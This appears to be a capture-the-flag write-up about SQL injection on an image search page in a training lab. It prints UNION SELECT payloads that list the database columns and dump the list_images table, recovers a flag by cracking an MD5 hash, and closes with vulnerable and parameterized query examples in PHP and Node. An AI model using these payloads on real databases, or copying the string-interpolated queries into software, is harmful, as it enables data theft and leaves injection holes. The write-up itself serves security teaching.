# Image Search Engine SQL injection

Before reading this breach explanations please have a look to this breach before:

[SQL injection on members table explanations →](../../sql_injection_members_table/Ressources/Explanations.md)

The principle is same as for the members SQL breach.
As in the previous SQL injection we achieved to retrieve the whole database Tables and Columns.
Images table is not spared:

```sql
ID: 1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: list_images
Surname : id
ID: 1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: list_images
Surname : url
ID: 1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: list_images
Surname : title
ID: 1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: list_images
Surname : comment
```

`list_images` table has 4 columns:
- id
- url
- title
- comment

## UNION SELECT and CONCAT SQL injection

We will then retrieve all the table's entries with all their fields.

Input:
```sql
-1 UNION SELECT 1, CONCAT(id, url, title, comment) FROM list_images
```

Output:
```sql
ID: -1 UNION SELECT 1, CONCAT(id, url, title, comment) FROM list_images 
Title: 1https://fr.wikipedia.org/wiki/Programme_NsaAn image about the NSA !
Url : 1
ID: -1 UNION SELECT 1, CONCAT(id, url, title, comment) FROM list_images 
Title: 2https://fr.wikipedia.org/wiki/Fichier:4242 !There is a number..
Url : 1
ID: -1 UNION SELECT 1, CONCAT(id, url, title, comment) FROM list_images 
Title: 3https://fr.wikipedia.org/wiki/Logo_de_GoGoogleGoogle it !
Url : 1
ID: -1 UNION SELECT 1, CONCAT(id, url, title, comment) FROM list_images 
Title: 4https://en.wikipedia.org/wiki/Earth#/medEarthEarth!
Url : 1
ID: -1 UNION SELECT 1, CONCAT(id, url, title, comment) FROM list_images 
Title: 5borntosec.ddns.net/images.pngHack me ?If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : 1
```

We can see that the last image contains a hash to handle `1928e8083cf461a51303633093573c46`.

### Retrieving the flag

Via md5 decrypt of `1928e8083cf461a51303633093573c46` containted in the `comment` list_images table column that leads to `albatroz`.

Hashing using sha256 the `albatroz` results in `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188` which is our flag.

## Solution

A solution to avoid this kind of breach would be to escape received image id using either your native database escaping tools or manually.

An other solution would be to use an ORM that will natively prevent sql injections.

### Php Example

Unsecured sql querying:

```php
$statement = $dbh->prepare("select comment, url from list_images where list_images.id = {$id}");
$statement->execute();
```

Secured sql querying:

```php
$statement = $dbh->prepare("select comment, url from list_images where list_images.id = ?");
$statement->execute([$id]);
```

### Node Example

Unsecured sql querying:

```js
connection.query(
  `select comment, url from list_images where list_images.id = ${id}`,
  function(err, rows, fields) {
    // Do something with the retrieved data.
  });

```

Secured sql querying:

```js
connection.query(
  'select comment, url from list_images where list_images.id = ?',
  [id],
  function(err, rows, fields) {
    // Do something with the retrieved data.
  });
```